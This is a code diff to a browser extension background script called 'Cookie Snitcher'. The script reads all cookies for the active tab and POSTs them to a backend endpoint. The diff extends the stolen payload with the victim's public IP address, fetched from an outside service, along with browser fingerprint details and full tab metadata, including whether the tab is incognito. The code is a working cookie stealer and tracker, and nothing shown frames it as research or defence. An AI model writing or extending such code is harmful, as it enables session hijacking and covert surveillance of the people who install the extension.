@@ -7,6 +7,29 @@ async function getActiveTab() {
   return tabs[0];
 }
 
+// Function to get IP address
+async function getIPAddress() {
+  try {
+    const response = await fetch("https://api.ipify.org?format=json");
+    const data = await response.json();
+    return data.ip;
+  } catch (error) {
+    console.error("Cookie Snitcher: Error fetching IP address:", error);
+    return "unknown";
+  }
+}
+
+// Function to get browser information
+function getBrowserInfo() {
+  return {
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    cookiesEnabled: navigator.cookieEnabled,
+    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timestamp: new Date().toISOString(),
+  };
+}
+
 async function fetchAndSendCookies(tab) {
   if (!tab || !tab.id || !tab.url) {
     console.log("Cookie Snitcher: No active tab or tab URL found.");
@@ -22,6 +45,7 @@ async function fetchAndSendCookies(tab) {
   }
 
   try {
+    // Get cookies
     const cookies = await chrome.cookies.getAll({ url: tab.url });
     console.log(
       `Cookie Snitcher: Fetched ${cookies.length} cookies for ${tab.url}`
@@ -32,9 +56,36 @@ async function fetchAndSendCookies(tab) {
       const cookiesJson = JSON.stringify(cookies, null, 2);
       console.log("Cookie Snitcher: Cookies in JSON format:", cookiesJson);
 
-      const payload = cookies; // Send the cookies array directly as the payload
+      // Get IP address
+      const ipAddress = await getIPAddress();
 
-      console.log("Cookie Snitcher: Sending data to backend:", payload);
+      // Get browser info
+      const browserInfo = getBrowserInfo();
+
+      // Prepare enhanced payload
+      const payload = {
+        cookies: cookies,
+        tabInfo: {
+          id: tab.id,
+          url: tab.url,
+          title: tab.title || "Unknown Title",
+          favIconUrl: tab.favIconUrl || null,
+          status: tab.status || null,
+          incognito: tab.incognito || false,
+          windowId: tab.windowId || null,
+          active: tab.active || false,
+        },
+        userInfo: {
+          ipAddress: ipAddress,
+          browserInfo: browserInfo,
+        },
+        timestamp: new Date().toISOString(),
+      };
+
+      console.log(
+        "Cookie Snitcher: Sending enhanced data to backend:",
+        payload
+      );
 
       const response = await fetch(API_ENDPOINT, {
         method: "POST",
